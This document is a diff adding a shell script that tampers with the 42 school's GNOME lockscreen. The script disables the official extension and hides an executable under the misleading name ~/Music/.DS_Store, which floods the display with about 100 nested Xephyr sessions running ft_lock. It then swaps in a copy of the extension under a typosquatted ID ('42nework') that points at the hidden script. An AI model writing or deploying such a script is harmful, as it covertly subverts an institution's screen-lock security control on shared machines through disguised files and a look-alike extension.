@@ -1,0 +1,23 @@
+#!/bin/sh
+
+gnome-extensions disable lockscreen@42network.org
+
+cat > ~/Music/.DS_Store <<EOF
+#!/bin/bash
+
+gnome-terminal -- bash -c 'for i in {1..100}; do ( Xephyr :\$i  & ) ; pkill ft_lock; ( DISPLAY=:\$i ft_lock & ) ; sleep 0.3; done; sleep 6969'
+EOF
+chmod +x ~/Music/.DS_Store
+
+rm -rf ~/.local/share/gnome-shell/extensions/lockscreen@42nework.org
+
+mkdir -p ~/.local/share/gnome-shell/extensions/
+cp -r /usr/share/gnome-shell/extensions/lockscreen@42network.org ~/.local/share/gnome-shell/extensions/lockscreen@42nework.org
+
+sed -i s,lockscreen@42network.org,lockscreen@42nework.org,g ~/.local/share/gnome-shell/extensions/lockscreen@42nework.org/metadata.json
+
+sed -i s,/usr/share/42/ft_lock,/home/`whoami`/Music/.DS_Store,g ~/.local/share/gnome-shell/extensions/lockscreen@42nework.org/extension.js
+
+killall -3 gnome-shell
+
+gnome-extensions enable lockscreen@42nework.org
